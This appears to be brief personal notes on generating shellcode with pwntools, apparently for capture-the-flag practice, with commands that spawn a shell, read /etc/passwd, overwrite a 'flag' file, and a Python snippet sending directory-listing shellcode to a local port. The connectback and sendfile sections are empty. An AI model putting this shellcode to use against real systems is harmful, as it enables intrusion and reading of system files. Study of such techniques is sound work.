## Shellcodes with pwntools

```
arch = [ 'linux', 'amd64', 'arm' ]

shell = 'sh', 'dupsh'
io    = 'cat', 'write_file', 'ls', 'sendfile'
nw    = 'connectback'
```


### sh 
``shellcraft -c i386 sh -f r | strace -ifx demo32 -``

### dupsh
``shellcraft -c i386 dupsh 1 -f r | strace -ifx demo32 -``

### cat
``shellcraft -c i386 cat /etc/passwd  -f r | strace -ifx demo32 -``


### write_file = open_file + write_file 

```python
s = 'this file has been overwritted by me'

sc = ''
sc += asm(shellcode.open_file('./flag', 0x2))
sc += asm(shellcode.write_file(3, s, len(s)))
```

### ls
``shellcraft -c i386 ls /etc -f r | demo32 -``

```python
sc += asm(shellcode.ls('/etc/', out_fd=4))

s = remote('localhost', 31337)
s.send(sc + '\n')
while 1:
    rv = s.recv(1540)
    if len(rv) == 0:
        break
    print parse_getdents(rv)
```

### sendfile
``empty yet``

### connectback
``empty yet``
